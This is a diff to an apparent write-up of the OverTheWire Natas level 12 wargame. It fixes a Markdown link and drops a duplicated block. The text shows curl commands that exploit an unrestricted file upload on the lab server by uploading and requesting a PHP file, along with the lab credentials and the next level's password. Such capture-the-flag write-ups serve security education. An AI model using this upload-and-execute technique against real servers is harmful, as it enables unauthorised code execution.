@@ -568,7 +568,7 @@
 		</body>
 		</html>
 
-3.	Well. It seems to work. Let's try if [https://www.owasp.org/index.php/Unrestricted_File_Upload](Unrestricted File Upload)
+3.	Well. It seems to work. Let's try if [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
 	vulnerability is exploitable. If true, by clicking on
 
 		http://natas12.natas.labs.overthewire.org/upload/dlqovjn3kh.php
@@ -602,23 +602,3 @@
 
 		$ curl -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 http://natas12.natas.labs.overthewire.org/upload/r0qf78xvfq.php
 		jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
-
-
-
-	upload it with the command of point 2 and try to get the content of
-	the generated `HREF`. It shlud be something like
-
-		http://natas12.natas.labs.overthewire.org/upload/XXXXXXXXXX.php
-
-		$ curl -i -u natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 -F "MAX_FILE_SIZE=1000" -F "filename=image.php" -F "uploadedfile=@./image.php" http://natas12.natas.labs.overthewire.org
-		<html>
-		<head>
-		[cut]
-		</head>
-		<body>
-		<h1>natas12</h1>
-		<div id="content">
-		The file <a href="upload/zunjkfwh9t.php">upload/zunjkfwh9t.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
-		</div>
-		</body>
-		</html>
